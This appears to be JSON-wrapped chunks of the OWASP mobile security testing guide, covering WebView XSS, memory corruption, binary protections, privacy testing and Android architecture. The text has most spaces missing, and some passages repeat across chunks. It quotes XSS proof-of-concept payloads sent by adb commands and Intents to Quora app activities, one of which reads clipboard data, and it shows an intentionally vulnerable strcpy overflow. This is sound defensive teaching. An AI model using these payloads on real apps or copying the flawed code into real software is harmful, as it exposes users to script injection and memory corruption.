presses,performingarbitraryactions,etc.). Inthecontextofnativeapps,XSSrisksarefarlessprevalentforthesimplereasonthesekindsofapplicationsdonotrely onawebbrowser. However,appsusingWebViewcomponents,suchasWKWebVieworthedeprecatedUIWebViewoniOS andWebViewonAndroid,arepotentiallyvulnerabletosuchattacks. Anolderbutwell-knownexampleisthelocalXSSissueintheSkypeappforiOS,firstidentifiedby PhilPurviance. The Skypeappfailedtoproperlyencodethenameofthemessagesender,allowinganattackertoinjectmaliciousJavaScript tobeexecutedwhenauserviewsthemessage. Inhisproof-of-concept,Philshowedhowtoexploittheissueandsteala user’saddressbook. Static Analysis - Security Testing Considerations TakeacloselookatanyWebViewspresentandinvestigateforuntrustedinputrenderedbytheapp. XSSissuesmayexistiftheURLopenedbyWebViewispartiallydeterminedbyuserinput. Thefollowingexampleisfrom anXSSissueintheZohoWebService,reportedbyLinusSärud. Java webView.loadUrl(\"javascript:initialize(\" +myNumber +\");\"); Kotlin webView.loadUrl(\"javascript:initialize($myNumber);\") AnotherexampleofXSSissuesdeterminedbyuserinputispublicoverriddenmethods. Java @Override public boolean shouldOverrideUrlLoading(WebViewview,Stringurl){ if(url.substring(0,6).equalsIgnoreCase(\"yourscheme:\")){ //parsetheURLobjectandexecutefunctions } } Kotlin funshouldOverrideUrlLoading(view:WebView,url:String):Boolean { if(url.substring(0,6).equals(\"yourscheme:\",ignoreCase =true)){ //parsetheURLobjectandexecutefunctions } } SergeyBobrovwasabletotakeadvantageofthisinthefollowingHackerOnereport. AnyinputtotheHTMLparameter wouldbetrustedinQuora’sActionBarContentActivity. Payloadsweresuccessfulusingadb,clipboarddataviaModalCon- tentActivity,andIntentsfrom3rdpartyapplications. • ADB $adb shell $am start -ncom.quora.android/com.quora.android.ActionBarContentActivity \\ -eurl 'http://test/test' -ehtml 'XSS<script>alert(123)</script>' • ClipboardData 79\\n$am start -ncom.quora.android/com.quora.android.ModalContentActivity \\ -eurl 'http://test/test' -ehtml \\ '<script>alert(QuoraAndroid.getClipboardData());</script>' • 3rdpartyIntentinJavaorKotlin: Intenti =newIntent(); i.setComponent(newComponentName(\"com.quora.android\", \"com.quora.android.ActionBarContentActivity\")); i.putExtra(\"url\",\"http://test/test\"); i.putExtra(\"html\",\"XSSPoC <script>alert(123)</script>\"); view.getContext().startActivity(i); vali=Intent() i.component =ComponentName(\"com.quora.android\", \"com.quora.android.ActionBarContentActivity\") i.putExtra(\"url\",\"http://test/test\") i.putExtra(\"html\",\"XSSPoC <script>alert(123)</script>\") view.context.startActivity(i) IfaWebViewisusedtodisplayaremotewebsite,theburdenofescapingHTMLshiftstotheserverside. IfanXSSflaw exists on the web server, this can be used to execute script in the context of the WebView. As such, it is important to performstaticanalysisofthewebapplicationsourcecode. Verifythatthefollowingbestpracticeshavebeenfollowed: • NountrusteddataisrenderedinHTML,JavaScriptorotherinterpretedcontextsunlessitisabsolutelynecessary. • Appropriateencodingisappliedtoescapecharacters,suchasHTMLentityencoding. Note: escapingrulesbecome complicatedwhenHTMLisnestedwithinothercode,forexample,renderingaURLlocatedinsideaJavaScriptblock. Considerhowdatawillberenderedinaresponse. Forexample,ifdataisrenderedinaHTMLcontext,sixcontrolcharacters thatmustbeescaped: Character Escaped & &amp; < &lt; > &gt; ” &quot; ’ &#x27; / &#x2F; For a comprehensive list of escaping rules and other prevention measures, refer to the OWASP XSS Prevention Cheat Sheet. Dynamic Analysis - Security Testing Considerations XSS issues can be best detected using manual and/or automated input fuzzing, i.e. injecting HTML tags and special characters into all available input fields to verify the web application denies invalid inputs or escapes the HTML meta- charactersinitsoutput. AreflectedXSSattackreferstoanexploitwheremaliciouscodeisinjectedviaamaliciouslink. Totestfortheseattacks, automatedinputfuzzingisconsideredtobeaneffectivemethod. Forexample,theBURPScannerishighlyeffectivein identifyingreflectedXSSvulnerabilities. Asalwayswithautomatedanalysis,ensureallinputvectorsarecoveredwitha manualreviewoftestingparameters. Memory Corruption Bugs Memorycorruptionbugsareapopularmainstaywithhackers. Thisclassofbugresultsfromaprogrammingerrorthat causes the program to access an unintended memory location. Under the right conditions, attackers can capitalize on thisbehaviortohijacktheexecutionflowofthevulnerableprogramandexecutearbitrarycode. Thiskindofvulnerability occursinanumberofways: 80\\n• Bufferoverflows: Thisdescribesaprogrammingerrorwhereanappwritesbeyondanallocatedmemoryrangefor aparticularoperation. Anattackercanusethisflawtooverwriteimportantcontroldatalocatedinadjacentmemory, suchasfunctionpointers. Bufferoverflowswereformerlythemostcommontypeofmemorycorruptionflaw,but havebecomelessprevalentovertheyearsduetoanumberoffactors. Notably,awarenessamongdevelopersof therisksinusingunsafeClibraryfunctionsisnowacommonbestpracticeplus,catchingbufferoverflowbugsis relativelysimple. However,itisstillworthtestingforsuchdefects. • Out-of-bounds-access: Buggypointerarithmeticmaycauseapointerorindextoreferenceapositionbeyondthe boundsoftheintendedmemorystructure(e.g.bufferorlist). Whenanappattemptstowritetoanout-of-bounds address, a crash or unintended behavior occurs. If the attackercan control the targetoffset and manipulate the contentwrittentosomeextent,codeexecutionexploitislikelypossible. • Dangling pointers: These occur when an object with an incoming reference to a memory location is deleted ordeallocated, buttheobjectpointerisnotreset. Iftheprogramlaterusesthedanglingpointertocallavirtual functionofthealreadydeallocatedobject,itispossibletohijackexecutionbyoverwritingtheoriginalvtablepointer. Alternatively,itispossibletoreadorwriteobjectvariablesorothermemorystructuresreferencedbyadangling pointer. • Use-after-free: Thisreferstoaspecialcaseofdanglingpointersreferencingreleased(deallocated)memory. After amemoryaddressiscleared,allpointersreferencingthelocationbecomeinvalid,causingthememorymanagerto returntheaddresstoapoolofavailablememory. Whenthismemorylocationiseventuallyre-allocated,accessing theoriginalpointerwillreadorwritethedatacontainedinthenewlyallocatedmemory. Thisusuallyleadstodata corruptionandundefinedbehavior,butcraftyattackerscansetuptheappropriatememorylocationstoleverage controloftheinstructionpointer. • Integeroverflows: Whentheresultofanarithmeticoperationexceedsthemaximumvaluefortheintegertype defined by the programmer, this results in the value “wrapping around” the",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 52
    }
  },
  {
    "text": "• Dangling pointers: These occur when an object with an incoming reference to a memory location is deleted ordeallocated, buttheobjectpointerisnotreset. Iftheprogramlaterusesthedanglingpointertocallavirtual functionofthealreadydeallocatedobject,itispossibletohijackexecutionbyoverwritingtheoriginalvtablepointer. Alternatively,itispossibletoreadorwriteobjectvariablesorothermemorystructuresreferencedbyadangling pointer. • Use-after-free: Thisreferstoaspecialcaseofdanglingpointersreferencingreleased(deallocated)memory. After amemoryaddressiscleared,allpointersreferencingthelocationbecomeinvalid,causingthememorymanagerto returntheaddresstoapoolofavailablememory. Whenthismemorylocationiseventuallyre-allocated,accessing theoriginalpointerwillreadorwritethedatacontainedinthenewlyallocatedmemory. Thisusuallyleadstodata corruptionandundefinedbehavior,butcraftyattackerscansetuptheappropriatememorylocationstoleverage controloftheinstructionpointer. • Integeroverflows: Whentheresultofanarithmeticoperationexceedsthemaximumvaluefortheintegertype defined by the programmer, this results in the value “wrapping around” the maximum integer value, inevitably resultinginasmallvaluebeingstored. Conversely,whentheresultofanarithmeticoperationissmallerthanthe minimumvalueoftheintegertype,anintegerunderflowoccurswheretheresultislargerthanexpected. Whether aparticularintegeroverflow/underflowbugisexploitabledependsonhowtheintegerisused. Forexample,ifthe integertypeweretorepresentthelengthofabuffer,thiscouldcreateabufferoverflowvulnerability. • Formatstringvulnerabilities: Whenuncheckeduserinputispassedtotheformatstringparameteroftheprintf familyofCfunctions,attackersmayinjectformattokenssuchas‘%c’and‘%n’toaccessmemory. Formatstring bugsareconvenienttoexploitduetotheirflexibility. Shouldaprogramoutputtheresultofthestringformatting operation,theattackercanreadandwritetomemoryarbitrarily,thusbypassingprotectionfeaturessuchasASLR. Theprimarygoalinexploitingmemorycorruptionisusuallytoredirectprogramflowintoalocationwheretheattackerhas placedassembledmachineinstructionsreferredtoasshellcode. OniOS,thedataexecutionpreventionfeature(asthe nameimplies)preventsexecutionfrommemorydefinedasdatasegments. Tobypassthisprotection,attackersleverage return-orientedprogramming(ROP).Thisprocessinvolveschainingtogethersmall,pre-existingcodechunks(“gadgets”) in the text segment where these gadgets may execute a function useful to the attacker or, call mprotect to change memoryprotectionsettingsforthelocationwheretheattackerstoredtheshellcode. Android apps are, for the most part, implemented in Java which is inherently safe from memory corruption issues by design. However,nativeappsutilizingJNIlibrariesaresusceptibletothiskindofbug. Inrarecases,Androidappsthatuse XML/JSONparserstounwrapJavaobjectsarealsosubjecttomemorycorruptionbugs. Anexampleofsuchvulnerability wasfoundinthePayPalapp. Similarly,iOSappscanwrapC/C++callsinObj-CorSwift,makingthemsusceptibletothesekindofattacks. Example: Thefollowingcodesnippetshowsasimpleexampleforaconditionresultinginabufferoverflowvulnerability. void copyData(char *userId){ char smallBuffer[10];//sizeof10 strcpy(smallBuffer,userId); } Toidentifypotentialbufferoverflows,lookforusesofunsafestringfunctions(strcpy,strcat,otherfunctionsbeginning withthe“str”prefix,etc.) andpotentiallyvulnerableprogrammingconstructs,suchascopyinguserinputintoalimited- sizebuffer. Thefollowingshouldbeconsideredredflagsforunsafestringfunctions: • strcat 81\\n• strcpy • strncat • strlcat • strncpy • strlcpy • sprintf • snprintf • gets Also,lookforinstancesofcopyoperationsimplementedas“for”or“while”loopsandverifylengthchecksareperformed correctly. Verifythatthefollowingbestpracticeshavebeenfollowed: • Whenusingintegervariablesforarrayindexing,bufferlengthcalculations,oranyothersecurity-criticaloperation, verifythatunsignedintegertypesareusedandperformpreconditiontestsareperformedtopreventthepossibility ofintegerwrapping. • Theappdoesnotuseunsafestringfunctionssuchasstrcpy,mostotherfunctionsbeginningwiththe“str”prefix, sprint,vsprintf,gets,etc.; • IftheappcontainsC++code,ANSIC++stringclassesareused; • Incaseofmemcpy,makesureyoucheckthatthetargetbufferisatleastofequalsizeasthesourceandthatboth buffersarenotoverlapping. • iOSappswritteninObjective-CuseNSStringclass. CappsoniOSshoulduseCFString,theCoreFoundationrepre- sentationofastring. • Nountrusteddataisconcatenatedintoformatstrings. Static Analysis Security Testing Considerations Staticcodeanalysisoflow-levelcodeisacomplextopicthatcouldeasilyfillitsownbook. AutomatedtoolssuchasRATS combinedwithlimitedmanualinspectioneffortsareusuallysufficienttoidentifylow-hangingfruits. However, memory corruption conditions often stem from complex causes. For example, a use-after-free bug may actually be the result of an intricate, counter-intuitive race condition not immediately apparent. Bugs manifesting from deep instances of overlookedcodedeficienciesaregenerallydiscoveredthroughdynamicanalysisorbytesterswhoinvesttimetogaina deepunderstandingoftheprogram. Dynamic Analysis Security Testing Considerations Memory corruption bugs are best discovered via input fuzzing: an automated black-box software testing technique in whichmalformeddataiscontinuallysenttoanapptosurveyforpotentialvulnerabilityconditions. Duringthisprocess, theapplicationismonitoredformalfunctionsandcrashes. Shouldacrashoccur,thehope(atleastforsecuritytesters) isthattheconditionscreatingthecrashrevealanexploitablesecurityflaw. Fuzztestingtechniquesorscripts(oftencalled“fuzzers”)willtypicallygeneratemultipleinstancesofstructuredinputina semi-correctfashion. Essentially,thevaluesorargumentsgeneratedareatleastpartiallyacceptedbythetargetapplica- tion,yetalsocontaininvalidelements,potentiallytriggeringinputprocessingflawsandunexpectedprogrambehaviors. A good fuzzer exposes a substantial amount of possible program execution paths (i.e. high coverage output). Inputs are either generated from scratch (“generation-based”) or derived from mutating known, valid input data (“mutation- based”). Formoreinformationonfuzzing,refertotheOWASPFuzzingGuide. Binary Protection Mechanisms Position Independent Code PIC(PositionIndependentCode)iscodethat,beingplacedsomewhereintheprimarymemory,executesproperlyregard- lessofitsabsoluteaddress. PICiscommonlyusedforsharedlibraries,sothatthesamelibrarycodecanbeloadedina 82\\nlocationineachprogramaddressspacewhereitdoesnotoverlapwithothermemoryinuse(forexample,othershared libraries). PIE (Position Independent Executable) are executable binaries made entirely from PIC. PIE binaries are used to enable ASLR(AddressSpaceLayoutRandomization)whichrandomlyarrangestheaddressspacepositionsofkeydataareasof aprocess,includingthebaseoftheexecutableandthepositionsofthestack,heapandlibraries. Memory Management Automatic Reference Counting ARC(AutomaticReferenceCounting)isamemorymanagementfeatureoftheClangcompilerexclusivetoObjective-Cand Swift. ARCautomaticallyfreesupthememoryusedbyclassinstanceswhenthoseinstancesarenolongerneeded. ARC differsfromtracinggarbagecollectioninthatthereisnobackgroundprocessthatdeallocatestheobjectsasynchronously atruntime. Unliketracinggarbagecollection,ARCdoesnothandlereferencecyclesautomatically. Thismeansthataslongasthere are“strong”referencestoanobject,itwillnotbedeallocated. Strongcross-referencescanaccordinglycreatedeadlocks andmemoryleaks. Itisuptothedevelopertobreakcyclesbyusingweakreferences. Youcanlearnmoreabouthowit differsfromGarbageCollectionhere. Garbage Collection GarbageCollection(GC)isanautomaticmemorymanagementfeatureofsomelanguagessuchasJava/Kotlin/Dart. The garbage collector attempts to reclaim memory which was allocated by the program, but is no longer referenced—also called garbage. The Android runtime (ART) makes use of an improved version of GC. You can learn more about how it differsfromARChere. Manual Memory Management Manualmemory managementistypically requiredin native librarieswritten inC/C++ whereARCand GC donot apply. Thedeveloperisresponsiblefordoingpropermemorymanagement. Manualmemorymanagementisknowntoenable several major classes of bugs into a program when used incorrectly, notably violations of memory safety or memory leaks. Moreinformationcanbefoundin“MemoryCorruptionBugs”. Stack Smashing Protection Stackcanarieshelppreventstackbufferoverflowattacksbystoringahiddenintegervalueonthestackrightbeforethe return pointer. This value is then validated before the return statement of the function is executed. A buffer overflow attack often overwrites a region of memory in order to overwrite the return pointer and take over the program flow. If stackcanariesareenabled,theywillbeoverwrittenaswellandtheCPUwillknowthatthememoryhasbeentampered with. Stackbufferoverflowisatypeofthemoregeneralprogrammingvulnerabilityknownasbufferoverflow(orbufferoverrun). Overfillingabufferonthestackismorelikelytoderailprogramexecutionthanoverfillingabufferontheheapbecause thestackcontainsthereturnaddressesforallactivefunctioncalls. 83\\nMobile App User Privacy Protection Overview IMPORTANTDISCLAIMER:TheMASTGisnotalegalhandbook. Therefore,wewillnotdeepdiveintotheGDPRorother possibly relevant legislation here. This chapter is meant to introduce you to the topics and provide you with essential referencesthatyoucanusetocontinueresearchingbyyourself. We’llalsodoourbestefforttoprovideyouwithtestsor guidelinesfortestingtheprivacy-relatedrequirementslistedintheOWASPMASVS. The Main Problem Mobileappshandleallkindsofsensitiveuserdata,fromidentificationandbankinginformationtohealthdata. Thereisan understandableconcernabouthowthisdataishandledandwhereitendsup. Wecanalsotalkabout“benefitsusersget fromusingtheapps”vs“therealpricethattheyarepayingforit”(usuallyandunfortunatelywithoutevenbeingaware ofit). The Solution",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 53
    }
  },
  {
    "text": "the program flow. If stackcanariesareenabled,theywillbeoverwrittenaswellandtheCPUwillknowthatthememoryhasbeentampered with. Stackbufferoverflowisatypeofthemoregeneralprogrammingvulnerabilityknownasbufferoverflow(orbufferoverrun). Overfillingabufferonthestackismorelikelytoderailprogramexecutionthanoverfillingabufferontheheapbecause thestackcontainsthereturnaddressesforallactivefunctioncalls. 83\\nMobile App User Privacy Protection Overview IMPORTANTDISCLAIMER:TheMASTGisnotalegalhandbook. Therefore,wewillnotdeepdiveintotheGDPRorother possibly relevant legislation here. This chapter is meant to introduce you to the topics and provide you with essential referencesthatyoucanusetocontinueresearchingbyyourself. We’llalsodoourbestefforttoprovideyouwithtestsor guidelinesfortestingtheprivacy-relatedrequirementslistedintheOWASPMASVS. The Main Problem Mobileappshandleallkindsofsensitiveuserdata,fromidentificationandbankinginformationtohealthdata. Thereisan understandableconcernabouthowthisdataishandledandwhereitendsup. Wecanalsotalkabout“benefitsusersget fromusingtheapps”vs“therealpricethattheyarepayingforit”(usuallyandunfortunatelywithoutevenbeingaware ofit). The Solution (pre-2020) Toensurethatusersareproperlyprotected,legislationsuchastheGeneralDataProtectionRegulation(GDPR)inEurope hasbeendevelopedanddeployed(applicablesinceMay25,2018),forcingdeveloperstobemoretransparentregarding thehandlingofsensitiveuserdata. Thishasbeenmainlyimplementedusingprivacypolicies. The Challenge Therearetwomaindimensionstoconsiderhere: • DeveloperCompliance: Developersneedtocomplywithlegalprivacyprinciplessincetheyareenforcedbylaw. Developersneedtobettercomprehendthelegalprinciplesinordertoknowwhatexactlytheyneedtoimplement toremaincompliant. Ideally,atleast,thefollowingmustbefulfilled: – Privacy-by-Designapproach(Art. 25GDPR,“Dataprotectionbydesignandbydefault”). – PrincipleofLeastPrivilege(“Everyprogramandeveryuserofthesystemshouldoperateusingtheleast setofprivilegesnecessarytocompletethejob.”) • UserEducation: Usersneedtobeeducatedabouttheirsensitivedataandinformedabouthowtousetheappli- cationproperly(toensuresecurehandlingandprocessingoftheirinformation). Note: Moreoftenthannotappswillclaimtohandlecertaindata,butinrealitythat’snotthecase. TheIEEEarticle “EngineeringPrivacyin Smartphone Apps: A TechnicalGuideline Catalogfor App Developers” by Majid Hatamian givesaveryniceintroductiontothistopic. Protection Goals for Data Protection When an app needs personal information from a user for its business process, the user needs to be informed on what happenswiththedataandwhytheappneedsit. Ifthereisathirdpartydoingtheactualprocessingofthedata,theapp shouldinformtheuseraboutthattoo. Surelyyou’realreadyfamiliarwiththeclassictriadofsecurityprotectiongoals: confidentiality,integrity,andavailability. However,youmightnotbeawareofthethreeprotectiongoalsthathavebeenproposedtofocusondataprotection: • Unlinkability: – Users’privacy-relevantdatamustbeunlinkabletoanyothersetofprivacy-relevantdataoutsideofthedomain. – Includes: dataminimization,anonymization,pseudonymization,etc. • Transparency: 84\\n– Usersshouldbeabletorequestallinformationthattheapplicationhasonthem,andreceiveinstructionson howtorequestthisinformation. – Includes: privacypolicies,usereducation,properloggingandauditingmechanisms,etc. • Intervenability: – Usersshouldbeabletocorrecttheirpersonalinformation,requestitsdeletion,withdrawanygivenconsent atanytime,andreceiveinstructionsonhowtodoso. – Includes: privacy settings directly in the app, single points of contact for individuals’ intervention requests (e.g.in-appchat,telephonenumber,e-mail),etc. SeeSection5.1.1“Introductiontodataprotectiongoals”inENISA’s“Privacyanddataprotectioninmobileapplica- tions”formoredetaileddescriptions. Addressing both security and privacy protection goals at the same time is a very challenging task (if not impossible in many cases). There is an interesting visualization in IEEE’s publication Protection Goals for Privacy Engineering called “TheThreeAxes”representingtheimpossibilitytoensure100%ofeachofthesixgoalssimultaneously. Mostpartsoftheprocessesderivedfromtheprotectiongoalsaretraditionallycoveredinaprivacypolicy. However,this approachisnotalwaysoptimal: • developersarenotlegalexpertsbutstillneedtobecompliant. • userswouldberequiredtoreadusuallylongandwordypolicies. The New Approach (Google’s and Apple’s take on this) In order to address these challenges and help users easily understand how their data is being collected, handled, and shared, Google and Apple introduced new privacy labeling systems (very much along the lines of NIST’s proposal for ConsumerSoftwareCybersecurityLabeling: • theAppStoreNutritionLabels(since2020). • theGooglePlayDataSafetySection(since2021). Asanewrequirementonbothplatforms,it’svitalthattheselabelsareaccurateinordertoprovideuserassuranceand mitigateabuse. Google ADA MASA program Performingregularsecuritytestingcanhelpdevelopersidentifykeyvulnerabilitiesintheirapps. GooglePlaywillallow developerswhohavecompletedindependentsecurityvalidationtoshowcasethisontheirDatasafetysection. Thishelps usersfeelmoreconfidentaboutanapp’scommitmenttosecurityandprivacy. Inordertoprovidemoretransparencyintotheapp’ssecurityarchitecture,GooglehasintroducedtheMASA(MobileAppli- cationSecurityAssessment)programaspartoftheAppDefenseAlliance(ADA).WithMASA,Googlehasacknowledged theimportanceofleveragingagloballyrecognizedstandardformobileappsecuritytothemobileappecosystem. Devel- operscanworkdirectlywithanAuthorizedLabpartnertoinitiateasecurityassessment. Googlewillrecognizedevelopers whohavehadtheirapplicationsindependentlyvalidatedagainstasetofMASVSLevel1requirementsandwillshowcase thisontheirDatasafetysection. 85\\nIfyouareadeveloperandwouldliketoparticipate,youshouldcompletetheIndependentSecurityReviewform. Notethatthelimitednatureoftestingdoesnotguaranteecompletesafetyoftheapplication. Thisindependentreview maynotbescopedtoverifytheaccuracyandcompletenessofadeveloper’sDatasafetydeclarations. Developersremain solelyresponsibleformakingcompleteandaccuratedeclarationsintheirapp’sPlaystorelisting. References Youcanlearnmoreaboutthisandotherprivacyrelatedtopicshere: • iOSAppPrivacyPolicy • iOSPrivacyDetailsSectionontheAppStore • iOSPrivacyBestPractices • AndroidAppPrivacyPolicy • AndroidDataSafetySectiononGooglePlay • PreparingyourappforthenewDatasafetysectioninGooglePlay • AndroidPrivacyBestPractices Testing for Privacy in Mobile Apps Thefollowingisalistofcommonprivacyviolationsthatyouasasecuritytestershouldreport(althoughnotanexhaustive list): • Example 1: An app that accesses a user’s inventory of installed apps and doesn’t treat this data as personal or sensitivedatabysendingitoverthenetwork(violatingMSTG-STORAGE-4)ortoanotherappviaIPCmechanisms (violatingMSTG-STORAGE-6). • Example2: Anappdisplayssensitivedatasuchascreditcarddetailsoruserpasswordswithoutuserauthorization e.g.biometrics(violatingMSTG-AUTH-10). • Example3: Anappthataccessesauser’sphoneorcontactbookdataanddoesn’ttreatthisdataaspersonalor sensitivedata,additionallysendingitoveranunsecurednetworkconnection(violatingMSTG-NETWORK-1). • Example4: Anappcollectsdevicelocation(whichisapparentlynotrequiredforitsproperfunctioning)anddoes nothaveaprominentdisclosureexplainingwhichfeatureusesthisdata(violatingMSTG-PLATFORM-1). YoucanfindmorecommonviolationsinGooglePlayConsoleHelpbygoingtoPolicyCentre->Privacy,deception anddeviceabuse->Userdata. 86\\nAsyoucanseethisisdeeplyrelatedtoothertestingcategories. Whenyou’retestingthemyou’reoftenindirectlytesting forUserPrivacyProtection. Keepthisinmindsinceitwillhelpyouprovidebetterandmorecomprehensivereports. Often you’llalsobeabletoreuseevidencefromothertestsinordertotestforUserPrivacyProtection). Testing User Education on Data Privacy on the App Marketplace Atthispoint,we’reonlyinterestedinknowingwhichprivacy-relatedinformationisbeingdisclosedbythedevelopersand tryingtoevaluateifitseemsreasonable(similarlyasyou’ddowhentestingforpermissions). It’spossiblethatthedevelopersarenotdeclaringcertaininformationthatisindeedbeingcollectedand/orshared, butthat’satopicforadifferenttestextendingthisonehere. Aspartofthistest,youarenotsupposedtoprovide privacyviolationassurance. Static Analysis Youcanfollowthesesteps: 1. Searchfortheappinthecorrespondingappmarketplace(e.g.GooglePlay,AppStore). 2. Gotothesection“PrivacyDetails”(AppStore)or“SafetySection”(GooglePlay). 3. Verifyifthere’sanyinformationavailableatall. Thetestpassesifthedeveloperhascompliedwiththeappmarketplaceguidelinesandincludedtherequiredlabelsand explanations. Storeandprovidetheinformationyougotfromtheappmarketplaceasevidence,sothatyoucanlateruse ittoevaluatepotentialviolationsofprivacyordataprotection. Dynamic analysis Asanoptionalstep,youcanalsoprovidesomekindofevidenceaspartofthistest. Forinstance,ifyou’retestinganiOS appyoucaneasilyenableappactivityrecordingandexportaPrivacyReportcontainingdetailedappaccesstodifferent resourcessuchasphotos,contacts,camera,microphone,networkconnections,etc. Doing this has actually many advantages for testing other MASVS categories. It provides very useful information that youcanusetotestnetworkcommunicationforMASVS-NETWORKorwhentestingappinteractionwiththeplatformfor MASVS-PLATFORM.Whiletestingtheseothercategoriesyoumighthavetakensimilarmeasurementsusingothertesting tools. Youcanalsoprovidethisasevidenceforthistest. Ideally, the information available should be compared against what the app is actually meant to do. However, that’sfarfromatrivialtaskthatcouldtakefromseveraldaystoweekstocompletedependingonyourresources andsupportfromautomatedtooling. Italsoheavilydependsontheappfunctionalityandcontextandshouldbe ideallyperformedonawhiteboxsetupworkingverycloselywiththeappdevelopers. Testing User Education on Security Best Practices Testingthismightbeespeciallychallengingifyouintendtoautomateit. Werecommendusingtheappextensivelyand trytoanswerthefollowingquestionswheneverapplicable: • Fingerprint usage: when fingerprints are used for authentication providing access to high-risk transac- tions/information, doestheappinformtheuseraboutpotentialissueswhenhavingmultiplefingerprintsofotherpeopleregistered tothedeviceaswell? • Rooting/Jailbreaking: whenrootorjailbreakdetectionisimplemented, does the app inform the user of the fact that certain high-risk actions will carry additional risk due to the jailbro- ken/rootedstatusofthedevice? 87\\n• Specificcredentials: whenausergetsarecoverycode,apasswordorapinfromtheapplication(orsetsone), doestheappinstructtheusertoneversharethiswithanyoneelseandthatonlytheappwillrequestit? • Applicationdistribution: incaseofahigh-riskapplicationandinordertopreventusersfromdownloadingcom- promisedversionsoftheapplication, doestheappmanufacturerproperlycommunicatetheofficialwayofdistributingtheapp(e.g.fromGooglePlayor theAppStore)? • ProminentDisclosure: inanycase, doestheappdisplayprominentdisclosureofdataaccess,collection,use,andsharing? e.g.doestheappusethe AppTrackingTransparencyFrameworktoaskforthepermissiononiOS? Somereferencesinclude: • Open-SourceLicensesandAndroid-https://www.bignerdranch.com/blog/open-source-licenses-and-android/ • SoftwareLicensesinPlainEnglish-https://tldrlegal.com/ • AppleAccessingprivatedata-https://developer.apple.com/design/human-interface-guidelines/privacy •",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 54
    }
  },
  {
    "text": "tothedeviceaswell? • Rooting/Jailbreaking: whenrootorjailbreakdetectionisimplemented, does the app inform the user of the fact that certain high-risk actions will carry additional risk due to the jailbro- ken/rootedstatusofthedevice? 87\\n• Specificcredentials: whenausergetsarecoverycode,apasswordorapinfromtheapplication(orsetsone), doestheappinstructtheusertoneversharethiswithanyoneelseandthatonlytheappwillrequestit? • Applicationdistribution: incaseofahigh-riskapplicationandinordertopreventusersfromdownloadingcom- promisedversionsoftheapplication, doestheappmanufacturerproperlycommunicatetheofficialwayofdistributingtheapp(e.g.fromGooglePlayor theAppStore)? • ProminentDisclosure: inanycase, doestheappdisplayprominentdisclosureofdataaccess,collection,use,andsharing? e.g.doestheappusethe AppTrackingTransparencyFrameworktoaskforthepermissiononiOS? Somereferencesinclude: • Open-SourceLicensesandAndroid-https://www.bignerdranch.com/blog/open-source-licenses-and-android/ • SoftwareLicensesinPlainEnglish-https://tldrlegal.com/ • AppleAccessingprivatedata-https://developer.apple.com/design/human-interface-guidelines/privacy • AndroidApppermissionsbestpractices-https://developer.android.com/training/permissions/requesting.html#exp lain 88\\nAndroid Platform Overview This chapter introduces the Android platform from an architecture point of view. The following five key areas are dis- cussed: 1. Androidarchitecture 2. Androidsecurity: defense-in-depthapproach 3. Androidapplicationstructure 4. Androidapplicationpublishing 5. Androidapplicationattacksurface VisittheofficialAndroiddeveloperdocumentationwebsiteformoredetailsabouttheAndroidplatform. Android Architecture AndroidisaLinux-basedopensourceplatformdevelopedbytheOpenHandsetAlliance(aconsortiumleadbyGoogle), which serves as a mobile operating system (OS). Today the platform is the foundation for a wide variety of modern technology, such as mobile phones, tablets, wearable tech, TVs, and other smart devices. Typical Android builds ship witharangeofpre-installed(“stock”)appsandsupportinstallationofthird-partyappsthroughtheGooglePlaystoreand othermarketplaces. Android’s software stack is composed of several different layers. Each layer defines interfaces and offers specific ser- vices. 89\\nKernel: At the lowest level, Android is based on a variation of the Linux Kernel containing some significant additions, including Low Memory Killer, wake locks, the Binder IPC driver, etc. For the purpose of the MASTG, we’ll focus on the user-modepartoftheOS,whereAndroidsignificantlydiffersfromatypicalLinuxdistribution. Thetwomostimportant componentsforusarethemanagedruntimeusedbyapplications(ART/Dalvik)andBionic,Android’sversionofglibc,the GNUClibrary. HAL:Ontopofthekernel,theHardwareAbstractionLayer(HAL)definesastandardinterfaceforinteractingwithbuilt-in hardwarecomponents. SeveralHALimplementationsarepackagedintosharedlibrarymodulesthattheAndroidsystem calls when required. This is the basis for allowing applications to interact with the device’s hardware. For example, it allowsastockphoneapplicationtouseadevice’smicrophoneandspeaker. Runtime Environment: Android apps are written in Java and Kotlin and then compiled to Dalvik bytecode which can bethenexecutedusingaruntimethatinterpretsthebytecodeinstructionsandexecutesthemonthetargetdevice. For Android, thisistheAndroidRuntime(ART).ThisissimilartotheJVM(JavaVirtualMachine)forJavaapplications, orthe MonoRuntimefor.NETapplications. DalvikbytecodeisanoptimizedversionofJavabytecode. ItiscreatedbyfirstcompilingtheJavaorKotlincodetoJava bytecode,usingthejavacandkotlinccompilersrespectively,producing.classfiles. Finally,theJavabytecodeisconverted toDalvikbytecodeusingthed8tool. DalvikbytecodeispackedwithinAPKandAABfilesintheformof.dexfilesandis usedbyamanagedruntimeonAndroidtoexecuteitonthedevice. 90\\nBeforeAndroid5.0(APIlevel21),AndroidexecutedbytecodeontheDalvikVirtualMachine(DVM),whereitwastranslated intomachinecodeatexecutiontime,aprocessknownasjust-in-time(JIT)compilation. Thisenablestheruntimetobenefit fromthespeedofcompiledcodewhilemaintainingtheflexibilityofcodeinterpretation. SinceAndroid5.0(APIlevel21),AndroidexecutesbytecodeontheAndroidRuntime(ART)whichisthesuccessorofthe DVM.ARTprovidesimprovedperformanceaswellascontextinformationinappnativecrashreports,byincludingboth Javaandnativestackinformation. ItusesthesameDalvikbytecodeinputtomaintainbackwardcompatibility. However, ART executes the Dalvik bytecode differently, using a hybrid combination of ahead-of-time (AOT), just-in-time (JIT) and profile-guidedcompilation. • AOTpre-compilesDalvikbytecodeintonativecode,andthegeneratedcodewillbesavedondiskwiththe.oatexten- sion(ELFbinary). Thedex2oattoolcanbeusedtoperformthecompilationandcanbefoundat/system/bin/dex2oat onAndroiddevices. AOTcompilationisexecutedduringtheinstallationoftheapp. Thismakestheapplicationstart faster,asnocompilationisneededanymore. However,thisalsomeansthattheinstalltimeincreasesascompared toJITcompilation. Additionally,sinceapplicationsarealwaysoptimizedagainstthecurrentversionoftheOS,this meansthatsoftwareupdateswillrecompileallpreviouslycompiledapplications,resultinginasignificantincrease in the system update time. Finally, AOT compilation will compile the entire application, even if certain parts are neverusedbytheuser. • JIThappensatruntime. • Profile-guided compilationisahybridapproachthatwasintroducedinAndroid7(APIlevel24)tocombatthe 